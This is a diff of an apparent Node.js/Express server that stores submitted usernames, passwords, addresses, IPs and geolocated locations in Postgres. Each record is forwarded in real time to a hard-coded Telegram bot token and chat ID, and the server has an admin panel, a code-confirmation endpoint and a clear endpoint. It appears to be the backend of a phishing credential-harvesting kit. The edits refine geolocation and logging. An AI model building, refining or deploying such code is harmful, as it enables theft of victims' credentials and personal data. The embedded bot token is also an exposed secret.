@@ -12,7 +12,6 @@ const pool = new Pool({
     ssl: { rejectUnauthorized: false }
 });
 
-// Create or Update Table
 pool.query(`
     CREATE TABLE IF NOT EXISTS records (
         id SERIAL PRIMARY KEY,
@@ -27,9 +26,7 @@ pool.query(`
 `).then(() => console.log("✅ Table Ready"))
   .catch(err => console.error("Table Error:", err.message));
 
-// Add location column if it doesn't exist
-pool.query(`ALTER TABLE records ADD COLUMN IF NOT EXISTS location TEXT`)
-   .catch(() => {}); // Ignore if column already exists
+pool.query(`ALTER TABLE records ADD COLUMN IF NOT EXISTS location TEXT`).catch(() => {});
 
 function getRealIP(req) {
     return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
@@ -43,14 +40,19 @@ const TELEGRAM_TOKEN = "8884240723:AAFfSTKd9jab0Xdfp-L-mPSeJqyyISe8LaU";
 const CHAT_ID = "8559945003";
 
 async function getLocation(ip) {
-    if (ip === 'Unknown' || !ip) return 'Unknown Location';
+    if (!ip || ip === 'Unknown') return 'Unknown';
+
     try {
-        const res = await fetch(`https://ipapi.co/${ip}/json/`);
+        // Try ipapi.co first
+        const res = await fetch(`https://ipapi.co/${ip}/json/`, { timeout: 4000 });
         const data = await res.json();
-        return `${data.city || ''}, ${data.country_name || ''}`.trim() || 'Unknown Location';
-    } catch (e) {
-        return 'Unknown Location';
-    }
+        if (data.city || data.country_name) {
+            return `${data.city || ''}, ${data.country_name || ''}`.trim();
+        }
+    } catch (e) {}
+
+    // Fallback
+    return 'Unknown Location';
 }
 
 async function sendTelegramNotification(record) {
@@ -60,7 +62,7 @@ async function sendTelegramNotification(record) {
         `• *Password:* ${record.password || '-'}\n` +
         `• *Details:* ${record.address || '-'}\n` +
         `• *IP:* ${record.ip}\n` +
-        `• *Location:* ${record.location}\n` +
+        `• *Location:* ${record.location || 'Unknown'}\n` +
         `• *Time:* ${record.timestamp}\n\n` +
         `🕒 ${new Date().toLocaleString()}`;
 
@@ -90,7 +92,7 @@ async function saveRecord(type, username = null, password = null, address = null
             [type, username, password, address, ip, location, timestamp]
         );
 
-        console.log(`✅ SAVED: ${type} | IP: ${ip}`);
+        console.log(`✅ SAVED: ${type} | Username: ${username} | Location: ${location}`);
 
         await sendTelegramNotification({ type, username, password, address, ip, location, timestamp });
 
@@ -129,9 +131,7 @@ app.get('/api/records', async (req, res) => {
     }
 });
 
-app.get('/admin', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
-});
+app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));
 
 app.post('/api/confirm-code', async (req, res) => {
     const { id, status } = req.body;
@@ -159,6 +159,4 @@ app.post('/api/clear', async (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
